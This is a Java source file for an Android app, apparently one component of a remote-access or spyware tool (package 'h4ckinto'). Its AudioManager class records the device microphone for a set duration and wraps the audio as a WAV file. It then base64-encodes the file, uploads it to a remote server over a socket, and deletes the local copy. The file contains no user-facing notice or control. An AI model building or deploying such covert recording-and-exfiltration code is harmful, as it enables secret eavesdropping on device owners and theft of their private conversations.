package com.h4ckinto.android.managers;

import android.content.Context;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import android.util.Log;

import com.h4ckinto.android.network.SocketManager;
import com.h4ckinto.android.utils.Constants;
import com.h4ckinto.android.utils.PermissionManager;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class AudioManager {
    private static final String TAG = "AudioManager";
    
    private Context context;
    private SocketManager socketManager;
    private AudioRecord audioRecord;
    private boolean isRecording = false;
    private Thread recordingThread;
    private File audioFilesDir;

    public AudioManager(Context context) {
        this.context = context;
        this.socketManager = SocketManager.getInstance(context);
        this.audioFilesDir = new File(context.getExternalFilesDir(null), Constants.AUDIO_FILES_DIR);
        if (!audioFilesDir.exists()) {
            audioFilesDir.mkdirs();
        }
    }

    public void startRecording(int durationSeconds) {
        if (!PermissionManager.hasAudioPermission(context)) {
            Log.w(TAG, "Audio permission not granted");
            return;
        }

        if (isRecording) {
            Log.d(TAG, "Already recording");
            return;
        }

        try {
            int bufferSize = AudioRecord.getMinBufferSize(
                Constants.AUDIO_SAMPLE_RATE,
                Constants.AUDIO_CHANNEL_CONFIG,
                Constants.AUDIO_ENCODING
            );

            audioRecord = new AudioRecord(
                MediaRecorder.AudioSource.MIC,
                Constants.AUDIO_SAMPLE_RATE,
                Constants.AUDIO_CHANNEL_CONFIG,
                Constants.AUDIO_ENCODING,
                bufferSize
            );

            if (audioRecord.getState() != AudioRecord.STATE_INITIALIZED) {
                Log.e(TAG, "AudioRecord initialization failed");
                return;
            }

            audioRecord.startRecording();
            isRecording = true;

            recordingThread = new Thread(() -> {
                recordAudio(durationSeconds);
            });
            recordingThread.start();

            Log.d(TAG, "Audio recording started for " + durationSeconds + " seconds");
        } catch (Exception e) {
            Log.e(TAG, "Error starting audio recording", e);
        }
    }

    private void recordAudio(int durationSeconds) {
        ByteArrayOutputStream audioData = new ByteArrayOutputStream();
        byte[] buffer = new byte[1024];
        long startTime = System.currentTimeMillis();
        long durationMillis = durationSeconds * 1000L;

        try {
            while (isRecording && (System.currentTimeMillis() - startTime) < durationMillis) {
                int bytesRead = audioRecord.read(buffer, 0, buffer.length);
                if (bytesRead > 0) {
                    audioData.write(buffer, 0, bytesRead);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error during audio recording", e);
        } finally {
            stopRecording();
            processAudioData(audioData.toByteArray());
        }
    }

    public void stopRecording() {
        if (!isRecording) {
            return;
        }

        isRecording = false;

        if (audioRecord != null) {
            try {
                audioRecord.stop();
                audioRecord.release();
                audioRecord = null;
            } catch (Exception e) {
                Log.e(TAG, "Error stopping audio recording", e);
            }
        }

        if (recordingThread != null) {
            try {
                recordingThread.join(1000); // Wait up to 1 second
            } catch (InterruptedException e) {
                Log.e(TAG, "Error waiting for recording thread", e);
            }
            recordingThread = null;
        }

        Log.d(TAG, "Audio recording stopped");
    }

    private void processAudioData(byte[] audioData) {
        try {
            // Save audio file locally
            String fileName = "audio_" + new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(new Date()) + ".wav";
            File audioFile = new File(audioFilesDir, fileName);
            
            // Write WAV header
            writeWavHeader(audioFile, audioData.length);
            
            // Write audio data
            FileOutputStream fos = new FileOutputStream(audioFile, true);
            fos.write(audioData);
            fos.close();

            // Send to server
            sendAudioToServer(audioFile, fileName);

        } catch (IOException e) {
            Log.e(TAG, "Error processing audio data", e);
        }
    }

    private void writeWavHeader(File file, int audioDataLength) throws IOException {
        FileOutputStream fos = new FileOutputStream(file);
        
        // WAV header
        fos.write("RIFF".getBytes());
        fos.write(intToByteArray(36 + audioDataLength)); // File size
        fos.write("WAVE".getBytes());
        fos.write("fmt ".getBytes());
        fos.write(intToByteArray(16)); // Subchunk1Size
        fos.write(shortToByteArray((short) 1)); // AudioFormat (PCM)
        fos.write(shortToByteArray((short) 1)); // NumChannels
        fos.write(intToByteArray(Constants.AUDIO_SAMPLE_RATE)); // SampleRate
        fos.write(intToByteArray(Constants.AUDIO_SAMPLE_RATE * 2)); // ByteRate
        fos.write(shortToByteArray((short) 2)); // BlockAlign
        fos.write(shortToByteArray((short) 16)); // BitsPerSample
        fos.write("data".getBytes());
        fos.write(intToByteArray(audioDataLength)); // Subchunk2Size
        
        fos.close();
    }

    private byte[] intToByteArray(int value) {
        return new byte[]{
            (byte) (value & 0xff),
            (byte) ((value >> 8) & 0xff),
            (byte) ((value >> 16) & 0xff),
            (byte) ((value >> 24) & 0xff)
        };
    }

    private byte[] shortToByteArray(short value) {
        return new byte[]{
            (byte) (value & 0xff),
            (byte) ((value >> 8) & 0xff)
        };
    }

    private void sendAudioToServer(File audioFile, String fileName) {
        try {
            JSONObject audioData = new JSONObject();
            audioData.put("file", true);
            audioData.put("name", fileName);
            audioData.put("buffer", android.util.Base64.encodeToString(
                java.nio.file.Files.readAllBytes(audioFile.toPath()), 
                android.util.Base64.DEFAULT
            ));
            
            socketManager.sendAudioData(audioData);
            Log.d(TAG, "Audio data sent to server: " + fileName);
            
            // Clean up local file
            if (audioFile.delete()) {
                Log.d(TAG, "Local audio file deleted: " + fileName);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error sending audio to server", e);
        }
    }

    public boolean isRecording() {
        return isRecording;
    }

    public void destroy() {
        stopRecording();
    }
}
